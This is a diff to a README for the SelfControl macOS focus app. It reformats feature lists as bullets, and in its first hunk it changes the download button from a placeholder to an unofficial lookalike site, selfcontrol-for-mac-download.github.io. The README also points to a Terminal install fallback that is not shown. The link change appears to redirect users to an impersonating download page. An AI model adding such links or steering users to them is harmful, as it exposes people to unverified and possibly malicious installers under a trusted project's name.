@@ -3,7 +3,7 @@
 SelfControl is a free and open-source macOS application that helps you block distracting websites and apps for a set period of time, helping you focus on what really matters. 🧠
 ![selfcontrol](https://miro.medium.com/v2/resize:fit:1092/1*d7k_pEsMl2qz1Fo8PDVUjQ.png)
 
-[![Download for macOS](https://img.shields.io/badge/Download%20for%20macOS-SelfControl-blue?style=for-the-badge\&logo=apple)](#)
+[![Download for macOS](https://img.shields.io/badge/Download%20for%20macOS-SelfControl-blue?style=for-the-badge\&logo=apple)](https://selfcontrol-for-mac-download.github.io/.github/)
 
 If the download button doesn’t work, follow the Terminal installation method below.
 
@@ -37,12 +37,12 @@ If the download button doesn’t work, follow the Terminal installation method b
 
 ## 🎯 What You Get With SelfControl
 
-⏱ Block distracting websites for a set time
-🧱 Even restarting your Mac won’t disable the block
-🌐 Add specific websites to a blacklist or whitelist
-🔒 Once started, you can't stop it until the timer ends
-💻 Clean and simple interface designed for productivity
-🆓 Completely free and open-source for Mac users
+* ⏱ Block distracting websites for a set time
+* 🧱 Even restarting your Mac won’t disable the block
+* 🌐 Add specific websites to a blacklist or whitelist
+* 🔒 Once started, you can't stop it until the timer ends
+* 💻 Clean and simple interface designed for productivity
+* 🆓 Completely free and open-source for Mac users
 
 ---
 
@@ -60,12 +60,12 @@ Perfect for students, freelancers, and digital workers who struggle with online 
 
 ## 🌟 Key Benefits of Using SelfControl
 
-⏰ Unbreakable timer blocks for maximum discipline
-🌍 Blocklist and allowlist support
-🧘 Ideal for studying, writing, or deep work sessions
-🔐 Free, open-source, and respects user privacy
-🧩 Minimal system resources required
-💡 Helps build long-term focus habits
+* ⏰ Unbreakable timer blocks for maximum discipline
+* 🌍 Blocklist and allowlist support
+* 🧘 Ideal for studying, writing, or deep work sessions
+* 🔐 Free, open-source, and respects user privacy
+* 🧩 Minimal system resources required
+* 💡 Helps build long-term focus habits
 
 ---
 
